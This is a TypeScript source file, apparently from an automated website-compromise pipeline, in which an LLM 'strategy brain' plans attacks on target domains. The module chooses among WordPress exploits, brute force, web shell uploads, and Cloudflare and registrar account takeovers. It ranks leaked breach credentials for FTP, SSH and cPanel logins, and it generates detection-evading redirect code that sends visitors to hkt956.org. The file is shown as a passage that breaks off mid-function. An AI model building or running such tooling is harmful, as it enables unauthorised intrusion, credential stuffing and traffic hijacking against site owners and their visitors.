/**
 * AI Strategy Brain — Central Intelligence for Pipeline Decision Making
 * 
 * ปัญหาเดิม: Pipeline ใช้ static if-else chain ตายตัว:
 *   if (isWordPress) → WP exploit
 *   else if (isCloudflare) → CF bypass
 *   else → generic upload
 * 
 * AI Strategy Brain แก้ปัญหานี้โดย:
 *   1. รับ recon data ทั้งหมด (prescreen, vuln scan, shodan, leakcheck, AI analysis)
 *   2. ใช้ LLM วิเคราะห์สถานการณ์แบบ real-time
 *   3. สร้าง prioritized attack plan แบบ custom ต่อ target
 *   4. ตัดสินใจ mid-attack pivot เมื่อพบข้อมูลใหม่
 *   5. เรียนรู้จาก attack history เพื่อปรับ strategy
 *   6. ประเมิน cost-benefit ก่อนลงมือแต่ละ phase
 * 
 * ทุก decision มี reasoning + confidence score ที่ส่งให้ user เห็นผ่าน Telegram
 */

import { invokeLLM } from "./_core/llm";
import {
  queryHistoricalPatterns,
  calculateMethodSuccessRates,
  getLearnedInsights,
  getCmsAttackProfile,
  type HistoricalPattern,
  type MethodSuccessRate,
  type LearnedInsight,
} from "./adaptive-learning";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

/** ข้อมูล recon ทั้งหมดที่ Brain ใช้ตัดสินใจ */
export interface BrainContext {
  targetUrl: string;
  targetDomain: string;

  // Phase 0: AI Target Analysis
  serverType?: string | null;
  cms?: string | null;
  cmsVersion?: string | null;
  phpVersion?: string | null;
  wafDetected?: string | null;
  wafStrength?: string | null;
  hostingProvider?: string | null;
  isCloudflare?: boolean;
  overallSuccessProbability?: number;

  // Phase 0.5: Redirect detection
  existingRedirectDetected?: boolean;
  existingRedirectUrl?: string | null;
  isCfLevelRedirect?: boolean;

  // Phase 2: Vuln scan
  isWordPress?: boolean;
  wpVersion?: string | null;
  vulnerabilities?: { type: string; severity: string; path: string }[];
  writablePaths?: string[];
  uploadEndpoints?: string[];
  exposedConfigs?: string[];

  // Phase 3: Shodan
  ftpOpen?: boolean;
  sshOpen?: boolean;
  cpanelOpen?: boolean;
  directAdminOpen?: boolean;
  pleskOpen?: boolean;
  mysqlOpen?: boolean;
  shodanVulns?: string[];
  allPorts?: number[];

  // Phase 4: LeakCheck
  leakedCredentials?: {
    email: string;
    password: string;
    username?: string;
    source?: string;
    isPlaintext?: boolean;
  }[];

  // Previous attempts in this run
  attemptedMethods?: string[];
  failedMethods?: string[];
  successfulMethods?: string[];

  // Time budget
  elapsedMs?: number;
  maxTimeMs?: number;
}

/** Attack method ที่ Brain สามารถเลือกได้ */
export type AttackMethod =
  | "wp_exploit"           // WordPress vulnerability exploit
  | "wp_brute_force"       // WordPress brute force login
  | "wp_rest_inject"       // WordPress REST API injection
  | "wp_db_inject"         // WordPress database injection
  | "wp_admin_upload"      // WordPress admin file upload
  | "cms_exploit"          // Non-WP CMS exploit
  | "ftp_upload"           // FTP file upload
  | "ssh_upload"           // SSH/SFTP file upload
  | "cpanel_file_manager"  // cPanel File Manager
  | "directadmin_upload"   // DirectAdmin upload
  | "shell_upload"         // Web shell upload via vuln
  | "cf_bypass"            // Cloudflare WAF bypass
  | "cf_takeover"          // Cloudflare account takeover
  | "registrar_takeover"   // DNS registrar takeover
  | "shellless_redirect"   // Redirect without shell (htaccess, config)
  | "redirect_takeover"    // Takeover existing redirect
  | "competitor_overwrite" // Overwrite competitor files
  | "iis_cloaking"         // IIS-specific cloaking
  | "generic_upload"       // Generic file upload attempts
  | "waf_bypass_upload"    // Upload with WAF bypass
  | "alt_upload"           // Alternative upload methods
  | "indirect_attack"      // Indirect attack (email, social)
  | "config_exploit"       // Server config exploitation
  | "dns_attack"           // DNS-based attacks
  | "advanced_exploit";    // AI-generated advanced exploit

/** แผนโจมตีที่ Brain สร้าง */
export interface AttackPlan {
  /** Attack methods เรียงตามลำดับความสำคัญ */
  steps: AttackStep[];
  /** เหตุผลโดยรวมของแผน */
  overallReasoning: string;
  /** ความมั่นใจโดยรวม (0-100) */
  overallConfidence: number;
  /** เวลาที่คาดว่าจะใช้ (ms) */
  estimatedTimeMs: number;
  /** ควรดำเนินการหรือไม่ */
  shouldProceed: boolean;
  /** ถ้าไม่ควร เพราะอะไร */
  abortReason?: string;
}

export interface AttackStep {
  method: AttackMethod;
  /** ความมั่นใจว่าจะสำเร็จ (0-100) */
  confidence: number;
  /** เหตุผลที่เลือก method นี้ */
  reasoning: string;
  /** ข้อมูลเพิ่มเติมสำหรับ method นี้ */
  params?: Record<string, unknown>;
  /** ควรข้ามถ้า method ก่อนหน้าสำเร็จแล้ว */
  skipIfPreviousSuccess?: boolean;
  /** dependencies — ต้องรัน method อื่นก่อน */
  dependsOn?: AttackMethod[];
  /** เวลาที่คาดว่าจะใช้ (ms) */
  estimatedTimeMs?: number;
}

/** ผลการตัดสินใจ mid-attack pivot */
export interface PivotDecision {
  shouldPivot: boolean;
  /** ถ้า pivot — method ใหม่ที่จะใช้ */
  newMethod?: AttackMethod;
  /** เหตุผลที่ pivot หรือไม่ pivot */
  reasoning: string;
  /** ความมั่นใจ (0-100) */
  confidence: number;
  /** ควรหยุดทั้งหมดเลยหรือไม่ */
  shouldAbort?: boolean;
  /** ข้อมูลใหม่ที่ทำให้ pivot */
  newIntelligence?: string;
}

/** ผลการประเมิน cost-benefit */
export interface CostBenefitAnalysis {
  shouldContinue: boolean;
  reasoning: string;
  confidence: number;
  /** เวลาที่เหลือ vs โอกาสสำเร็จ */
  timeVsReward: string;
  /** method ที่ยังไม่ได้ลองและมีโอกาสสำเร็จ */
  remainingViableMethods: AttackMethod[];
  /** ถ้าหยุด — สรุปผลที่ได้ */
  partialResults?: string;
}

// ═══════════════════════════════════════════════════════
//  CORE: CREATE ATTACK PLAN
// ═══════════════════════════════════════════════════════

/**
 * สร้างแผนโจมตีแบบ custom ต่อ target
 * ใช้ LLM วิเคราะห์ recon data + attack history → prioritized attack plan
 */
export async function createAttackPlan(ctx: BrainContext): Promise<AttackPlan> {
  // 1. ดึง historical data
  let historicalPatterns: HistoricalPattern[] = [];
  let methodRates: MethodSuccessRate[] = [];
  let cmsProfile: any = null;
  let learnedInsights: LearnedInsight[] = [];

  try {
    const [patterns, rates, insights] = await Promise.allSettled([
      queryHistoricalPatterns({
        cms: ctx.cms || undefined,
        serverType: ctx.serverType || undefined,
        waf: ctx.wafDetected || undefined,
      }),
      calculateMethodSuccessRates({
        cms: ctx.cms || undefined,
        serverType: ctx.serverType || undefined,
      }),
      getLearnedInsights({ cms: ctx.cms || undefined, waf: ctx.wafDetected || undefined }),
    ]);

    if (patterns.status === "fulfilled") historicalPatterns = patterns.value;
    if (rates.status === "fulfilled") methodRates = rates.value;
    if (insights.status === "fulfilled") learnedInsights = insights.value;

    if (ctx.cms) {
      try { cmsProfile = await getCmsAttackProfile(ctx.cms); } catch {}
    }
  } catch {}

  // 2. สร้าง context summary สำหรับ LLM
  const contextSummary = buildContextSummary(ctx, historicalPatterns, methodRates, cmsProfile, learnedInsights);

  // 3. ให้ LLM สร้าง attack plan
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `คุณคือ AI Strategy Brain — สมองกลางของระบบ attack pipeline
คุณต้องวิเคราะห์ข้อมูล recon ทั้งหมดแล้วสร้างแผนโจมตีที่ดีที่สุดสำหรับ target นี้

กฎสำคัญ:
1. ห้ามใช้ลำดับตายตัว — วิเคราะห์จากข้อมูลจริง
2. ถ้ามี leaked credentials → ให้ลอง FTP/SSH/cPanel ก่อน (เร็วและมีโอกาสสูง)
3. ถ้าเป็น WordPress → WP exploit มีโอกาสสูงกว่า generic upload
4. ถ้า redirect อยู่ที่ Cloudflare → ต้องใช้ CF takeover ไม่ใช่ server-side
5. ถ้ามี WAF แรง → ต้อง bypass ก่อนหรือใช้ method ที่ไม่ผ่าน WAF
6. ใช้ historical success rates เป็นตัวชี้วัด
7. ประเมิน confidence ตามจริง — อย่าให้สูงเกินไปถ้าไม่มีข้อมูล
8. ถ้าโอกาสสำเร็จต่ำมาก (<10%) ให้แนะนำหยุด
9. จัดลำดับ: เร็ว+โอกาสสูง ก่อน, ช้า+โอกาสต่ำ ทีหลัง
10. ถ้ามี competitor redirect → ต้องมี overwrite step

ตอบเป็น JSON ตาม schema ที่กำหนด`,
        },
        {
          role: "user",
          content: contextSummary,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "attack_plan",
          strict: true,
          schema: {
            type: "object",
            properties: {
              steps: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    method: { type: "string", description: "Attack method name" },
                    confidence: { type: "number", description: "0-100 confidence" },
                    reasoning: { type: "string", description: "Why this method" },
                    skipIfPreviousSuccess: { type: "boolean" },
                    estimatedTimeMs: { type: "number" },
                  },
                  required: ["method", "confidence", "reasoning", "skipIfPreviousSuccess", "estimatedTimeMs"],
                  additionalProperties: false,
                },
              },
              overallReasoning: { type: "string" },
              overallConfidence: { type: "number" },
              estimatedTimeMs: { type: "number" },
              shouldProceed: { type: "boolean" },
              abortReason: { type: "string" },
            },
            required: ["steps", "overallReasoning", "overallConfidence", "estimatedTimeMs", "shouldProceed", "abortReason"],
            additionalProperties: false,
          },
        },
      },
    });

    const parsed = JSON.parse(response.choices[0].message.content as string || "{}");

    // Validate and normalize
    const plan: AttackPlan = {
      steps: (parsed.steps || []).map((s: any) => ({
        method: validateMethod(s.method),
        confidence: Math.max(0, Math.min(100, s.confidence || 0)),
        reasoning: s.reasoning || "",
        skipIfPreviousSuccess: s.skipIfPreviousSuccess ?? true,
        estimatedTimeMs: s.estimatedTimeMs || 30000,
      })),
      overallReasoning: parsed.overallReasoning || "",
      overallConfidence: Math.max(0, Math.min(100, parsed.overallConfidence || 0)),
      estimatedTimeMs: parsed.estimatedTimeMs || 300000,
      shouldProceed: parsed.shouldProceed ?? true,
      abortReason: parsed.abortReason || undefined,
    };

    // Filter out invalid methods
    plan.steps = plan.steps.filter(s => s.method !== "unknown" as any);

    return plan;
  } catch (error: any) {
    // Fallback: rule-based plan
    return createRuleBasedPlan(ctx, methodRates);
  }
}

// ═══════════════════════════════════════════════════════
//  CORE: MID-ATTACK PIVOT DECISION
// ═══════════════════════════════════════════════════════

/**
 * ตัดสินใจว่าควร pivot กลยุทธ์หรือไม่
 * เรียกเมื่อ method ปัจจุบันล้มเหลว หรือพบข้อมูลใหม่
 */
export async function decidePivot(
  ctx: BrainContext,
  currentMethod: string,
  failureReason: string,
  newIntelligence?: string,
): Promise<PivotDecision> {
  const remaining = getRemainingMethods(ctx);
  if (remaining.length === 0) {
    return {
      shouldPivot: false,
      reasoning: "ไม่มี method เหลือให้ลอง",
      confidence: 95,
      shouldAbort: true,
    };
  }

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `คุณคือ AI Strategy Brain ที่ต้องตัดสินใจว่าควร pivot กลยุทธ์หรือไม่

สถานการณ์: method "${currentMethod}" ล้มเหลว
เหตุผล: ${failureReason}
${newIntelligence ? `ข้อมูลใหม่: ${newIntelligence}` : ""}

Methods ที่ลองแล้ว: ${ctx.attemptedMethods?.join(", ") || "none"}
Methods ที่ล้มเหลว: ${ctx.failedMethods?.join(", ") || "none"}
Methods ที่เหลือ: ${remaining.join(", ")}
เวลาที่ใช้ไป: ${Math.round((ctx.elapsedMs || 0) / 1000)}s / ${Math.round((ctx.maxTimeMs || 600000) / 1000)}s

Target: ${ctx.targetDomain}
Server: ${ctx.serverType || "unknown"}, CMS: ${ctx.cms || "none"}, WAF: ${ctx.wafDetected || "none"}
CF-level redirect: ${ctx.isCfLevelRedirect ? "YES" : "NO"}
Leaked creds: ${ctx.leakedCredentials?.length || 0}

ตัดสินใจ:
1. ควร pivot ไป method ไหน? (เลือกจาก remaining)
2. หรือควรหยุดทั้งหมด? (ถ้าโอกาสสำเร็จต่ำมาก)

ตอบเป็น JSON`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "pivot_decision",
          strict: true,
          schema: {
            type: "object",
            properties: {
              shouldPivot: { type: "boolean" },
              newMethod: { type: "string" },
              reasoning: { type: "string" },
              confidence: { type: "number" },
              shouldAbort: { type: "boolean" },
              newIntelligence: { type: "string" },
            },
            required: ["shouldPivot", "newMethod", "reasoning", "confidence", "shouldAbort", "newIntelligence"],
            additionalProperties: false,
          },
        },
      },
    });

    const parsed = JSON.parse(response.choices[0].message.content as string || "{}");
    return {
      shouldPivot: parsed.shouldPivot ?? false,
      newMethod: validateMethod(parsed.newMethod || ""),
      reasoning: parsed.reasoning || "",
      confidence: Math.max(0, Math.min(100, parsed.confidence || 50)),
      shouldAbort: parsed.shouldAbort ?? false,
      newIntelligence: parsed.newIntelligence || undefined,
    };
  } catch {
    // Fallback: simple pivot to next remaining method
    return {
      shouldPivot: remaining.length > 0,
      newMethod: remaining[0],
      reasoning: `LLM unavailable — fallback to next method: ${remaining[0]}`,
      confidence: 30,
      shouldAbort: remaining.length === 0,
    };
  }
}

// ═══════════════════════════════════════════════════════
//  CORE: COST-BENEFIT ANALYSIS
// ═══════════════════════════════════════════════════════

/**
 * ประเมินว่าควรไปต่อหรือหยุด
 * เรียกเมื่อหลาย methods ล้มเหลวแล้ว หรือเวลาใกล้หมด
 */
export async function analyzeCostBenefit(ctx: BrainContext): Promise<CostBenefitAnalysis> {
  const remaining = getRemainingMethods(ctx);
  const timeLeft = (ctx.maxTimeMs || 600000) - (ctx.elapsedMs || 0);
  const timeUsedPct = Math.round(((ctx.elapsedMs || 0) / (ctx.maxTimeMs || 600000)) * 100);

  // Quick checks
  if (remaining.length === 0) {
    return {
      shouldContinue: false,
      reasoning: "ลองทุก method แล้ว ไม่มีเหลือ",
      confidence: 99,
      timeVsReward: `ใช้เวลาไป ${timeUsedPct}% — ไม่มี method เหลือ`,
      remainingViableMethods: [],
    };
  }

  if (timeLeft < 10000) {
    return {
      shouldContinue: false,
      reasoning: "เวลาเหลือน้อยกว่า 10 วินาที",
      confidence: 95,
      timeVsReward: `เหลือ ${Math.round(timeLeft / 1000)}s — ไม่พอสำหรับ method ใดๆ`,
      remainingViableMethods: [],
    };
  }

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `คุณคือ AI Strategy Brain ที่ต้องประเมิน cost-benefit ของการโจมตีต่อ

Target: ${ctx.targetDomain}
Server: ${ctx.serverType || "unknown"}, CMS: ${ctx.cms || "none"}, WAF: ${ctx.wafDetected || "none"}
เวลาที่ใช้ไป: ${Math.round((ctx.elapsedMs || 0) / 1000)}s / ${Math.round((ctx.maxTimeMs || 600000) / 1000)}s (${timeUsedPct}%)
Methods ที่ลองแล้ว: ${ctx.attemptedMethods?.join(", ") || "none"}
Methods ที่ล้มเหลว: ${ctx.failedMethods?.join(", ") || "none"}
Methods ที่เหลือ: ${remaining.join(", ")}
Leaked creds: ${ctx.leakedCredentials?.length || 0}
CF-level redirect: ${ctx.isCfLevelRedirect ? "YES" : "NO"}

ประเมิน:
1. โอกาสสำเร็จของ methods ที่เหลือ?
2. คุ้มค่าที่จะใช้เวลาต่อหรือไม่?
3. ถ้าหยุด — ได้ผลอะไรบ้าง?

ตอบเป็น JSON`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "cost_benefit",
          strict: true,
          schema: {
            type: "object",
            properties: {
              shouldContinue: { type: "boolean" },
              reasoning: { type: "string" },
              confidence: { type: "number" },
              timeVsReward: { type: "string" },
              remainingViableMethods: { type: "array", items: { type: "string" } },
              partialResults: { type: "string" },
            },
            required: ["shouldContinue", "reasoning", "confidence", "timeVsReward", "remainingViableMethods", "partialResults"],
            additionalProperties: false,
          },
        },
      },
    });

    const parsed = JSON.parse(response.choices[0].message.content as string || "{}");
    return {
      shouldContinue: parsed.shouldContinue ?? true,
      reasoning: parsed.reasoning || "",
      confidence: Math.max(0, Math.min(100, parsed.confidence || 50)),
      timeVsReward: parsed.timeVsReward || "",
      remainingViableMethods: (parsed.remainingViableMethods || []).map((m: string) => validateMethod(m)).filter((m: string) => m !== "unknown"),
      partialResults: parsed.partialResults || undefined,
    };
  } catch {
    return {
      shouldContinue: remaining.length > 0 && timeLeft > 30000,
      reasoning: `LLM unavailable — ${remaining.length} methods เหลือ, ${Math.round(timeLeft / 1000)}s เหลือ`,
      confidence: 40,
      timeVsReward: `${remaining.length} methods × ~30s = ~${remaining.length * 30}s needed, ${Math.round(timeLeft / 1000)}s available`,
      remainingViableMethods: remaining as AttackMethod[],
    };
  }
}

// ═══════════════════════════════════════════════════════
//  CORE: CREDENTIAL RANKING
// ═══════════════════════════════════════════════════════

/**
 * AI จัดลำดับ credentials ตาม likelihood ว่าจะใช้ได้
 * แทนที่จะลองทุกตัวตามลำดับ → AI เลือกตัวที่น่าจะใช้ได้ก่อน
 */
export async function rankCredentials(
  credentials: BrainContext["leakedCredentials"],
  targetDomain: string,
  targetService: "ftp" | "ssh" | "cpanel" | "wp_admin" | "cloudflare" | "registrar",
): Promise<{ email: string; password: string; username?: string; score: number; reasoning: string }[]> {
  if (!credentials || credentials.length === 0) return [];
  if (credentials.length === 1) {
    return [{ ...credentials[0], score: 50, reasoning: "Only credential available" }];
  }

  try {
    const credList = credentials.map((c, i) => 
      `${i + 1}. email: ${c.email}, username: ${c.username || "N/A"}, password: ${c.password.substring(0, 3)}***, source: ${c.source || "unknown"}, plaintext: ${c.isPlaintext ? "yes" : "no"}`
    ).join("\n");

    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `จัดลำดับ credentials ตาม likelihood ว่าจะใช้ login ${targetService} ของ ${targetDomain} ได้

กฎ:
- Plaintext passwords มีโอกาสสูงกว่า hashed
- Email ที่ตรงกับ domain มีโอกาสสูงกว่า
- Username ที่เป็น admin/root/webmaster มีโอกาสสูงกว่า
- Password ที่ไม่ใช่ hash (ไม่ขึ้นต้นด้วย $2b$, $2a$, $argon2) มีโอกาสสูงกว่า
- Source ที่เป็น breach ล่าสุดมีโอกาสสูงกว่า

Credentials:
${credList}

ตอบเป็น JSON array ของ { index: number, score: number, reasoning: string } เรียงจากสูงไปต่ำ`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "ranked_creds",
          strict: true,
          schema: {
            type: "object",
            properties: {
              ranked: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    index: { type: "number" },
                    score: { type: "number" },
                    reasoning: { type: "string" },
                  },
                  required: ["index", "score", "reasoning"],
                  additionalProperties: false,
                },
              },
            },
            required: ["ranked"],
            additionalProperties: false,
          },
        },
      },
    });

    const parsed = JSON.parse(response.choices[0].message.content as string || "{}");
    return (parsed.ranked || [])
      .filter((r: any) => r.index >= 1 && r.index <= credentials.length)
      .map((r: any) => ({
        ...credentials[r.index - 1],
        score: Math.max(0, Math.min(100, r.score || 0)),
        reasoning: r.reasoning || "",
      }));
  } catch {
    // Fallback: simple heuristic ranking
    return rankCredentialsFallback(credentials, targetDomain, targetService);
  }
}

// ═══════════════════════════════════════════════════════
//  CORE: REDIRECT METHOD SELECTION
// ═══════════════════════════════════════════════════════

/**
 * AI เลือกวิธี redirect ที่เหมาะสมที่สุดสำหรับ target
 * แทนที่จะใช้ PHP redirect ทุกครั้ง
 */
export async function selectRedirectMethod(ctx: BrainContext): Promise<{
  method: "php_redirect" | "htaccess_redirect" | "js_redirect" | "meta_refresh" | "wp_option_redirect" | "nginx_conf" | "web_config";
  reasoning: string;
  confidence: number;
  code: string;
}> {
  const redirectUrl = ctx.existingRedirectUrl || "https://hkt956.org/";

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `เลือกวิธี redirect ที่เหมาะสมที่สุดสำหรับ target นี้

Target: ${ctx.targetDomain}
Server: ${ctx.serverType || "unknown"}
CMS: ${ctx.cms || "none"}
WAF: ${ctx.wafDetected || "none"}
PHP: ${ctx.phpVersion || "unknown"}
Redirect URL: ${redirectUrl}

วิธีที่เลือกได้:
1. php_redirect — <?php header("Location: ..."); ?> (ต้องมี PHP)
2. htaccess_redirect — RewriteRule (ต้องเป็น Apache)
3. js_redirect — <script>window.location=...</script> (ทำงานทุก server)
4. meta_refresh — <meta http-equiv="refresh"> (ทำงานทุก server)
5. wp_option_redirect — UPDATE wp_options SET option_value (ต้องเป็น WP + DB access)
6. nginx_conf — return 301 (ต้องเป็น Nginx + config access)
7. web_config — IIS URL Rewrite (ต้องเป็น IIS)

เลือกวิธีที่:
- มีโอกาสทำงานสูงสุดบน server นี้
- ยากต่อการตรวจจับ
- ไม่ถูก WAF block

ตอบเป็น JSON: { method, reasoning, confidence, code }`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "redirect_method",
          strict: true,
          schema: {
            type: "object",
            properties: {
              method: { type: "string" },
              reasoning: { type: "string" },
              confidence: { type: "number" },
              code: { type: "string" },
            },
            required: ["method", "reasoning", "confidence", "code"],
            additionalProperties: false,
          },
        },
      },
    });

    const parsed = JSON.parse(response.choices[0].message.content as string || "{}");
    const validMethods = ["php_redirect", "htaccess_redirect", "js_redirect", "meta_refresh", "wp_option_redirect", "nginx_conf", "web_config"];
    return {
      method: validMethods.includes(parsed.method) ? parsed.method : "php_redirect",
      reasoning: parsed.reasoning || "",
      confidence: Math.max(0, Math.min(100, parsed.confidence || 50)),
      code: parsed.code || `<?php header("Location: ${redirectUrl}"); exit; ?>`,
    };
  } catch {
    // Fallback
    const isApache = (ctx.serverType || "").toLowerCase().includes("apache");
    const isIIS = (ctx.serverType || "").toLowerCase().includes("iis");
    if (isIIS) {
      return { method: "web_config", reasoning: "IIS server detected", confidence: 60, code: `<?xml version="1.0"?><configuration><system.webServer><httpRedirect enabled="true" destination="${redirectUrl}" /></system.webServer></configuration>` };
    }
    if (isApache) {
      return { method: "htaccess_redirect", reasoning: "Apache server detected", confidence: 70, code: `RewriteEngine On\nRewriteRule ^(.*)$ ${redirectUrl} [R=301,L]` };
    }
    return { method: "php_redirect", reasoning: "Default PHP redirect", confidence: 50, code: `<?php header("Location: ${redirectUrl}"); exit; ?>` };
  }
}

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function buildContextSummary(
  ctx: BrainContext,
  patterns: HistoricalPattern[],
  rates: MethodSuccessRate[],
  cmsProfile: any,
  insights: LearnedInsight[],
): string {
  const sections: string[] = [];

  sections.push(`═══ TARGET ═══
Domain: ${ctx.targetDomain}
URL: ${ctx.targetUrl}
Server: ${ctx.serverType || "unknown"}
CMS: ${ctx.cms || "none"} ${ctx.cmsVersion ? `v${ctx.cmsVersion}` : ""}
PHP: ${ctx.phpVersion || "unknown"}
WAF: ${ctx.wafDetected || "none"} (strength: ${ctx.wafStrength || "unknown"})
Hosting: ${ctx.hostingProvider || "unknown"}
Cloudflare: ${ctx.isCloudflare ? "YES" : "NO"}
Overall Success Probability (from AI Analysis): ${ctx.overallSuccessProbability || "N/A"}%`);

  if (ctx.existingRedirectDetected) {
    sections.push(`═══ EXISTING REDIRECT ═══
Redirect detected: YES → ${ctx.existingRedirectUrl || "unknown"}
CF-level redirect: ${ctx.isCfLevelRedirect ? "YES (redirect at Cloudflare, not origin)" : "NO (redirect at origin server)"}`);
  }

  if (ctx.vulnerabilities && ctx.vulnerabilities.length > 0) {
    sections.push(`═══ VULNERABILITIES (${ctx.vulnerabilities.length}) ═══
${ctx.vulnerabilities.slice(0, 10).map(v => `- ${v.type} (${v.severity}): ${v.path}`).join("\n")}`);
  }

  if (ctx.writablePaths && ctx.writablePaths.length > 0) {
    sections.push(`═══ WRITABLE PATHS ═══\n${ctx.writablePaths.slice(0, 5).join(", ")}`);
  }

  const ports: string[] = [];
  if (ctx.ftpOpen) ports.push("FTP:21");
  if (ctx.sshOpen) ports.push("SSH:22");
  if (ctx.cpanelOpen) ports.push("cPanel:2083");
  if (ctx.directAdminOpen) ports.push("DA:2222");
  if (ctx.pleskOpen) ports.push("Plesk:8443");
  if (ctx.mysqlOpen) ports.push("MySQL:3306");
  if (ports.length > 0) {
    sections.push(`═══ OPEN PORTS (Shodan) ═══\n${ports.join(", ")}${ctx.shodanVulns?.length ? `\nVulns: ${ctx.shodanVulns.join(", ")}` : ""}`);
  }

  if (ctx.leakedCredentials && ctx.leakedCredentials.length > 0) {
    sections.push(`═══ LEAKED CREDENTIALS (${ctx.leakedCredentials.length}) ═══
${ctx.leakedCredentials.slice(0, 5).map(c => 
  `- ${c.email} / ${c.username || "N/A"} / ${c.isPlaintext ? "PLAINTEXT" : "hashed"} (${c.source || "unknown"})`
).join("\n")}`);
  }

  if (rates.length > 0) {
    sections.push(`═══ HISTORICAL SUCCESS RATES ═══
${rates.slice(0, 10).map(r => `- ${r.method}: ${r.successRate.toFixed(1)}% (${r.successes}/${r.attempts})`).join("\n")}`);
  }

  if (insights && insights.length > 0) {
    const insightStr = insights.map(i => `- ${i.patternKey}: ${i.insight}`).join("\n").substring(0, 500);
    sections.push(`═══ AI LEARNED INSIGHTS ═══\n${insightStr}`);
  }

  if (cmsProfile) {
    sections.push(`═══ CMS ATTACK PROFILE ═══
Best methods: ${cmsProfile.bestMethods?.join(", ") || "N/A"}
Avg success rate: ${cmsProfile.avgSuccessRate?.toFixed(1) || "N/A"}%
Common WAF bypasses: ${cmsProfile.commonWafBypasses?.join(", ") || "N/A"}`);
  }

  sections.push(`═══ AVAILABLE ATTACK METHODS ═══
wp_exploit, wp_brute_force, wp_rest_inject, wp_db_inject, wp_admin_upload,
cms_exploit, ftp_upload, ssh_upload, cpanel_file_manager, directadmin_upload,
shell_upload, cf_bypass, cf_takeover, registrar_takeover,
shellless_redirect, redirect_takeover, competitor_overwrite,
iis_cloaking, generic_upload, waf_bypass_upload, alt_upload,
indirect_attack, config_exploit, dns_attack, advanced_exploit

สร้างแผนโจมตีที่ดีที่สุดสำหรับ target นี้ เรียงตามลำดับความสำคัญ`);

  return sections.join("\n\n");
}

const ALL_METHODS: AttackMethod[] = [
  "wp_exploit", "wp_brute_force", "wp_rest_inject", "wp_db_inject", "wp_admin_upload",
  "cms_exploit", "ftp_upload", "ssh_upload", "cpanel_file_manager", "directadmin_upload",
  "shell_upload", "cf_bypass", "cf_takeover", "registrar_takeover",
  "shellless_redirect", "redirect_takeover", "competitor_overwrite",
  "iis_cloaking", "generic_upload", "waf_bypass_upload", "alt_upload",
  "indirect_attack", "config_exploit", "dns_attack", "advanced_exploit",
];

function validateMethod(method: string): AttackMethod {
  // Normalize common variations
  const normalized = method.toLowerCase().replace(/[-\s]/g, "_");
  if (ALL_METHODS.includes(normalized as AttackMethod)) return normalized as AttackMethod;
  // Fuzzy match
  const match = ALL_METHODS.find(m => normalized.includes(m) || m.includes(normalized));
  return match || "generic_upload";
}

function getRemainingMethods(ctx: BrainContext): AttackMethod[] {
  const attempted = new Set(ctx.attemptedMethods || []);
  const failed = new Set(ctx.failedMethods || []);
  return ALL_METHODS.filter(m => !attempted.has(m) && !failed.has(m));
}

function rankCredentialsFallback(
  credentials: NonNullable<BrainContext["leakedCredentials"]>,
  targetDomain: string,
  targetService: string,
): { email: string; password: string; username?: string; score: number; reasoning: string }[] {
  const domainBase = targetDomain.replace(/^www\./, "").split(".")[0];

  return credentials
    .map(c => {
      let score = 30;
      const reasons: string[] = [];

      // Plaintext bonus
      if (c.isPlaintext) { score += 25; reasons.push("plaintext password"); }

      // Domain match
      if (c.email.includes(domainBase)) { score += 20; reasons.push("email matches domain"); }

      // Admin-like username
      if (c.username && /^(admin|root|webmaster|administrator|cpanel|ftp)/i.test(c.username)) {
        score += 15; reasons.push("admin-like username");
      }

      // Not a hash
      const isHash = /^\$2[aby]\$|^\$argon2|^[a-f0-9]{32,64}$/i.test(c.password);
      if (!isHash) { score += 10; reasons.push("not a hash"); }

      return { ...c, score: Math.min(100, score), reasoning: reasons.join(", ") || "default" };
    })
    .sort((a, b) => b.score - a.score);
}

function createRuleBasedPlan(ctx: BrainContext, rates: MethodSuccessRate[]): AttackPlan {
  const steps: AttackStep[] = [];
  const hasCreds = (ctx.leakedCredentials?.length || 0) > 0;

  // Priority 1: CF-level redirect → CF takeover
  if (ctx.isCfLevelRedirect) {
    steps.push({
      method: "cf_takeover", confidence: hasCreds ? 45 : 15,
      reasoning: "CF-level redirect detected — must takeover at Cloudflare",
      skipIfPreviousSuccess: false, estimatedTimeMs: 30000,
    });
    steps.push({
      method: "registrar_takeover", confidence: hasCreds ? 25 : 10,
      reasoning: "Fallback if CF takeover fails",
      skipIfPreviousSuccess: true, estimatedTimeMs: 30000,
    });
  }

  // Priority 2: Leaked creds → direct access
  if (hasCreds) {
    if (ctx.ftpOpen) steps.push({ method: "ftp_upload", confidence: 60, reasoning: "FTP open + leaked creds", skipIfPreviousSuccess: true, estimatedTimeMs: 20000 });
    if (ctx.sshOpen) steps.push({ method: "ssh_upload", confidence: 55, reasoning: "SSH open + leaked creds", skipIfPreviousSuccess: true, estimatedTimeMs: 25000 });
    if (ctx.cpanelOpen) steps.push({ method: "cpanel_file_manager", confidence: 50, reasoning: "cPanel open + leaked creds", skipIfPreviousSuccess: true, estimatedTimeMs: 30000 });
  }

  // Priority 3: WordPress exploits
  if (ctx.isWordPress) {
    steps.push({ method: "wp_exploit", confidence: 40, reasoning: "WordPress detected", skipIfPreviousSuccess: true, estimatedTimeMs: 30000 });
    if (hasCreds) steps.push({ method: "wp_brute_force", confidence: 35, reasoning: "WP + leaked creds", skipIfPreviousSuccess: true, estimatedTimeMs: 20000 });
    steps.push({ method: "wp_rest_inject", confidence: 30, reasoning: "WP REST API", skipIfPreviousSuccess: true, estimatedTimeMs: 15000 });
  }

  // Priority 4: CMS exploits
  if (ctx.cms && !ctx.isWordPress) {
    steps.push({ method: "cms_exploit", confidence: 35, reasoning: `${ctx.cms} CMS detected`, skipIfPreviousSuccess: true, estimatedTimeMs: 30000 });
  }

